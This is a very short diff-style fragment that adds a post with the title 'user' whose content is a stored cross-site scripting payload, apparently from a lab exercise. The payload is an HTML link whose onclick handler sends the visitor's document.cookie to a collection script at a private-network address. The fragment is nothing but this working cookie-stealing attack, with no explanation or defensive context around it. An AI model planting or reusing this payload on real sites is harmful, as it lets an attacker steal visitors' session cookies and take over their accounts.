@@ -1,0 +1,2 @@
+Title: user
+Content: <a href="#" onclick="var img = new Image(); img.src='http://192.168.145.131/xss/stage2/cc_server.php?cookie='+document.cookie;">Click me!</a>
